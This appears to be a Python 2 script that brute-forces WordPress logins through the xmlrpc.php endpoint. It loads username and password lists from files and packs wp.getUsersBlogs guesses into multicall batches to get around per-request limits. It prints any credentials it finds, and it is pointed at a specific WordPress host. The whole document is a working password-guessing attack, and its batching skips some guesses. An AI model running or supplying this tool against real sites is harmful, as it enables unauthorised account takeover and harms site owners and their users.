from xmlrpclib import ServerProxy, MultiCall, ProtocolError, Fault

class Attack:

    def __init__(self, xmlrpc_endpoint, multicall_limit=10):
        self.target = xmlrpc_endpoint
        self.multicall_limit = multicall_limit
        self.proxy = ServerProxy(self.target)

        if not self.test_endpoint():
            raise Exception("Invalid XMLRPC Endpoint")


    def set_usernames(self, usernames):
        self.usernames = usernames

    def load_usernames(self, file):
        with open(file) as f:
            self.set_usernames(f.read().splitlines())
            f.close()

    def set_passwords(self, passwords):
        self.passwords = passwords

    def load_passwords(self, file):
        with open(file) as f:
            self.set_passwords(f.read().splitlines())
            f.close()

    def test_endpoint(self):
        try:
            self.proxy.system.listMethods()
            return True
        except ProtocolError, error:
            if error.errcode == 404:
                return False

    def execute(self):

        request_count = 0
        multicall = MultiCall(self.proxy)

        for username_index, username in enumerate(self.usernames):
            for password_index, password in enumerate(self.passwords):

                if (request_count < self.multicall_limit) and (password_index < len(self.passwords) - 1):
                    multicall.wp.getUsersBlogs(username, password)
                    request_count += 1
                else:
                    for req_id, result in enumerate(multicall().results):
                        if type(result) == type([]):
                            credentials = multicall._MultiCall__call_list[req_id][1]
                            print result
                            print "Credentials Found: (%s, %s)" % credentials
                            return

                    multicall = MultiCall(self.proxy)
                    request_count = 0

        print "Credentials Not Found"

attack = Attack("http://wp.soliman.io/xmlrpc.php")
attack.test_endpoint()
attack.load_usernames("usernames.txt")
attack.load_passwords("passwords.txt")
attack.execute()
